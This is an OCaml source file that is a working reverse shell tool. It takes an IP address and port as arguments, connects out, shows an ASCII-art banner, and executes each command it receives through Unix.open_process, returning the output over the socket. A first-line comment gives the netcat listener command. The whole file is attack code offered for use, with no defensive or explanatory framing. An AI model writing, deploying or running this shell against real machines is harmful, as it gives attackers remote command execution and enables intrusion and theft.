open Unix (* nc -l -p 13377 *)

let execute_command cmd =
  let ic, oc = Unix.open_process cmd in
  let output = ref "" in
  try
    while true do
      let line = input_line ic in
      output := !output ^ line ^ "\n"
    done;
    close_process (ic, oc);
    !output
  with End_of_file ->
    close_process (ic, oc);
    !output

let reverse_shell ip po =
  let we = "
  _____            _      _____          _
 |  __ \\          | |    / ____|        | |
 | |__) |___  __ _| |___| |     ___   __| | ___
 |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\
 | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \\_\\___|\\__,_|_/___|\\_____|\\___/ \\__,_|\\___|
" in
  let client_ip = Unix.gethostname () in
  let socket = Unix.socket PF_INET SOCK_STREAM 0 in
  try
    let server_address = Unix.ADDR_INET (Unix.inet_addr_of_string ip, po) in
    Unix.connect socket server_address;
    let output_channel = Unix.out_channel_of_descr socket in
    output_string output_channel we;
    flush output_channel;
    let input_channel = Unix.in_channel_of_descr socket in
    while true do
      output_string output_channel " $ ";
      flush output_channel;
      let cmd = input_line input_channel in
      let cmd = String.trim cmd in
      if cmd = "exit" then
        exit 0
      else
        let cmd_output = execute_command cmd in
        output_string output_channel cmd_output;
        flush output_channel
    done;
  with
  | Unix.Unix_error (err, _, _) ->
      prerr_endline (Unix.error_message err);
      Unix.close socket
  | Sys.Break ->
      Unix.close socket

let () =
  if Array.length Sys.argv <> 3 then
    Printf.printf "Please provide the IP address and port as command-line arguments.\n"
  else
    let ip = Sys.argv.(1) in
    let po = int_of_string Sys.argv.(2) in
    reverse_shell ip po
